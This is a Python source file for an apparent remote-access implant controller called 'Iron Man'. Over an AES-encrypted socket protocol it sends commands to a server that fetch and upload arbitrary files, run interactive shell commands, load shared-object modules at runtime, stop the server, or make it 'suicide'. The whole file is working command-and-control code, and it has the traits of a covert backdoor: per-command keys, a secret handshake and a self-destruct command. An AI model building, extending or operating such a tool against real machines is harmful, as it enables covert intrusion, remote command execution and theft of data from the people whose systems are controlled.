import enum
import errno
import json
import os
import pathlib
import random
import select
import socket
import struct
import sys
from typing import Any, Iterable

from tiny_aes import AES_init_ctx_iv, AES_CTR_xcrypt_buffer


# The result codes.
class ResultCode(enum.Enum):
    # Success.
    SUCCESS = 0

    # System/library calls failures.
    FAILED_SOCKET = 1
    FAILED_BIND = 2
    FAILED_LISTEN = 3
    FAILED_ACCEPT = 4
    FAILED_READ = 5
    FAILED_WRITE = 6
    FAILED_MALLOC = 7
    FAILED_STAT = 8
    FAILED_OPEN = 9
    FAILED_PIPE = 10
    FAILED_FORK = 11
    FAILED_DUP2 = 12
    FAILED_EXECVP = 13
    FAILED_SELECT = 14
    FAILED_KILL = 15
    FAILED_SYSCONF = 16
    FAILED_MPROTECT = 17
    FAILED_DLOPEN = 18
    FAILED_DLSYM = 19
    FAILED_UNLINK = 20

    # Other high level errors and codes.
    BUFFER_READING_OVERFLOW = 101
    BUFFER_WRITING_OVERFLOW = 102
    HANDSHAKE_FAILED = 103
    UNKNOWN_COMMAND = 104
    STOPPING = 105
    SUICIDING = 106


# The IDs of commands.
class CommandIDs(enum.Enum):
    DISCONNECT = 0
    ADD_MODULE_COMMAND = 1
    REMOVE_MODULE_COMMAND = 2
    STOP = 3
    SUICIDE = 4


class IronMan:
    """
    The Iron Man python client.
    """

    def __init__(self, config_path: pathlib.Path, host: str = '127.0.0.1', port: int = 25565):
        """
        Constructor.

        Args:
            config_path: Path to the Iron Man config file.
            host: The host to connect to.
            port: The port to connect to.
        """
        # Read the Iron Man config.
        with config_path.open() as config:
            self._config = json.load(config)

        self._module_commands = {}

        # Initialize the communication AES context.
        self._ctx = AES_init_ctx_iv(self._config['generated_consts']['communication_key'],
                                    self._config['generated_consts']['communication_iv'])

        # Connect to the Iron Man server.
        self._connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._connection.connect((host, port))

        # Send handshake.
        self.send('Q', self._config['generated_consts']['handshake'][0])

    def __del__(self):
        """
        Destructor.
        """
        # Close the connection if not previously closed.
        if not self._connection._closed:
            # Send the disconnect command message.
            self.send('Q', CommandIDs.DISCONNECT.value)

            # Close the connection.
            self._connection.close()

    @staticmethod
    def to_bytes(string: str, null_terminator: bool = False) -> bytes:
        """
        Convert string to bytes.

        Args:
            string: The string to convert.
            null_terminator: Whether to add a null terminator.

        Returns:
            The string converted to bytes.
        """
        return bytes([ord(c) for c in string] + ([0] if null_terminator else []))

    def send(self, fmt: str, *args: Any):
        """
        Send a message to the Iron Man server.

        Args:
            fmt: The struct format of the message to send.
            *args: The arguments to fill the format with.
        """
        # Construct and pack the message.
        message = struct.pack('<' + fmt, *args)

        # Send the size of the message.
        size = struct.pack('<Q', len(message))
        self._connection.send(self.to_bytes(AES_CTR_xcrypt_buffer(self._ctx, size, len(size))))

        # Send the message itself.
        self._connection.send(self.to_bytes(AES_CTR_xcrypt_buffer(self._ctx, message, len(message))))

    def receive(self, fmt: str = None) -> Any:
        """
        Receive a message from the Iron Man server.

        Args:
            fmt: The struct format of the message to receive.

        Returns:
            The message from the Iron Man server.
        """
        # Receive the size of the message.
        size = self._connection.recv(8)
        size = struct.unpack('<Q', self.to_bytes(AES_CTR_xcrypt_buffer(self._ctx, size, len(size))))[0]

        # Receive the message itself.
        message = self._connection.recv(size)
        message = AES_CTR_xcrypt_buffer(self._ctx, message, len(message))

        # Unpack the message.
        if fmt is not None:
            message = struct.unpack('<' + fmt, self.to_bytes(message))

        return message

    def check_result(self):
        """
        Receive the result of an operation from the Iron Man server and check if it succeeded.
        """
        # Receive the result.
        result = self._connection.recv(8)
        code, errno_value = struct.unpack('<II', self.to_bytes(AES_CTR_xcrypt_buffer(self._ctx, result, len(result))))

        # Throw the failure if not succeeded.
        if code != ResultCode.SUCCESS.value:
            raise ValueError(
                f'Got failed result: {ResultCode(code).name}' + (
                    f'[{errno.errorcode[errno_value]} - {os.strerror(errno_value)}]' if errno_value != 0 else ''))

    def send_run_command(self, command_name: str, fmt: str, *args: Any):
        """
        Send a run command message.

        Args:
            command_name: The command to run.
            fmt: The struct format of the message to send.
            *args: The arguments to fill the format with.
        """
        # Resolve the command ID, as well as its AES key and IV.
        command_id = self._config['generated_consts'][command_name + '_command_id'][0]
        key = bytearray(self._config['commands'][command_name][0])
        iv = bytearray(self._config['commands'][command_name][1])

        # Send the run command message.
        self.send(f'Q{len(key)}s{len(iv)}s' + fmt, command_id, key, iv, *args)

    def send_run_module_command(self, command_name: str, fmt: str, *args: Any):
        """
        Send a run module command message.

        Args:
            command_name: The command to run.
            fmt: The struct format of the message to send.
            *args: The arguments to fill the format with.
        """
        # Resolve the command ID, as well as its AES key and IV.
        command_config = self._module_commands[command_name]
        command_id = command_config['command_id']
        key = bytearray(command_config['config']['key'])
        iv = bytearray(command_config['config']['iv'])

        # Send the run module command message.
        self.send(f'Q{len(key)}s{len(iv)}s' + fmt, command_id, key, iv, *args)

    def get_file(self, path: str) -> str:
        """
        Get a file's content.

        Args:
            path: The path of the file to get its content.

        Returns:
            The file's content.
        """
        # Send the run command.
        self.send_run_command('get_file',
                              f'{len(path) + 1}s',
                              self.to_bytes(path, True))

        # Check the result.
        self.check_result()

        # Get the file's content and return it.
        return self.receive()

    def put_file(self, path: str, content: str):
        """
        Put a file by path and content.

        Args:
            path: The path to write the content into.
            content: The content to write to the file.
        """
        # Send the run command.
        self.send_run_command('put_file',
                              f'I{len(path) + 1}s{len(content)}s',
                              len(path) + 1, self.to_bytes(path, True), self.to_bytes(content, False))

        # Check the result.
        self.check_result()

        # Clear connection.
        self.receive()

    def run_shell(self, command: str, args: Iterable[str] = None) -> int:
        """
        Run a command with optional arguments.

        Args:
            command: The command to run.
            args: The arguments for the command.

        Returns:
            The command's exit code.
        """
        # Prepare the arguments.
        args = args or []
        func_args = []
        for arg in args:
            func_args += [len(arg) + 1, self.to_bytes(arg, True)]

        # Send the run command.
        self.send_run_command('run_shell',
                              f'I{len(command) + 1}sI' + ''.join(f'I{len(arg) + 1}s' for arg in args),
                              len(command) + 1, self.to_bytes(command, True), len(args), *func_args)

        stop = False
        print('Enter "KILL!" to kill the process.')
        # Loop on select until the child process dies or forcefully killed.
        while not stop:
            for readable in select.select([self._connection, sys.stdin], [], [], 0.05)[0]:
                if readable is self._connection:
                    # Data available from the Iron Man server.
                    output = self.receive()

                    if len(output) == 0:
                        # Child process died.
                        print('Child process died.')
                        stop = True
                        continue

                    # Print the message from the Iron Man server.
                    print('=' * 25, 'got', '=' * 25)
                    print(output)
                    print('-' * 55)

                elif readable is sys.stdin:
                    # Input from the user.
                    message = input()
                    print('>>>', message)

                    if message == 'KILL!':
                        # Kill child process.
                        print('Killing child process.')
                        self.send('I', 0)
                        stop = True
                        continue

                    # Send input to the Iron Man server.
                    self.send(f'I{len(message) + 1}s', len(message) + 1, self.to_bytes(message, True))

        # Check the result.
        self.check_result()

        # Get the command's exit code and return it.
        return self.receive('B')[0]

    def add_module_command(self, module_path: pathlib.Path, function_name: str, module_config_path: pathlib.Path,
                           arguments_format: str = None, results_format: str = None):
        """
        Add a module command by module path, function name, module config path, arguments format, and results format.

        Args:
            module_path: Path to an .so file containing the module to add.
            function_name: The function name inside the file to add.
            module_config_path: Path to the config of the module.
            arguments_format: The struct format for the arguments of the module.
            results_format: The struct format for the results of the module.
        """
        # Get the function config.
        with module_config_path.open() as module_config:
            function_config = json.load(module_config)[function_name]

        # Generate an ID for the command.
        command_id = random.randint(0, 2 ** 32 - 1)

        # Send the add module command message.
        self.send(f'QI{len(str(module_path)) + 1}sI{len(function_name) + 1}sQQ',
                  CommandIDs.ADD_MODULE_COMMAND.value, len(str(module_path)) + 1, self.to_bytes(str(module_path), True),
                  len(function_name) + 1, self.to_bytes(function_name, True), function_config['size'], command_id)

        # Check the result.
        self.check_result()

        # Save the added module command's config.
        self._module_commands[function_name] = {'config': function_config, 'command_id': command_id,
                                                'invocation': {'arguments_format': arguments_format,
                                                               'results_format': results_format}}

        # Add the module command to the instance.
        self.__setattr__(function_name, lambda *args, **kwargs: self.run_module_command(function_name, *args, **kwargs))

    def run_module_command(self, function_name: str, *args: Any, arguments_format: str = None,
                           results_format: str = None) -> Any:
        """
        Run a module command.

        Args:
            function_name: The function (module command) to run.
            *args: The arguments for the function.
            arguments_format: The struct format of the arguments.
            results_format: The struct format of the results.

        Returns:
            The results of the function.
        """
        # Resolve the arguments and results format is not specified.
        if arguments_format is None:
            arguments_format = self._module_commands[function_name]['invocation']['arguments_format']
        if results_format is None:
            results_format = self._module_commands[function_name]['invocation']['results_format']

        # Send the run module command.
        self.send_run_module_command(function_name, arguments_format, *args)

        # Check the result.
        self.check_result()

        # Get and return the results of the module command.
        return self.receive(results_format)

    def remove_module_command(self, function_name: str):
        """
        Remove a module command by function name.

        Args:
            function_name: The function (module command) to remove.
        """
        # Send the remove module command message.
        self.send('QQ', CommandIDs.REMOVE_MODULE_COMMAND.value, self._module_commands[function_name]['command_id'])

        # Check the result.
        self.check_result()

        # Remove the module command's config.
        self._module_commands.pop(function_name)

        # Remove the module command from the instance.
        self.__delattr__(function_name)

    def stop(self):
        """
        Stop Iron Man.
        """
        # Send the stop command message.
        self.send('Q', CommandIDs.STOP.value)

        # Close the connection.
        self._connection.close()

    def suicide(self):
        """
        Suicide Iron Man.
        """
        # Send the suicide command message.
        self.send('Q', CommandIDs.SUICIDE.value)

        # Close the connection.
        self._connection.close()
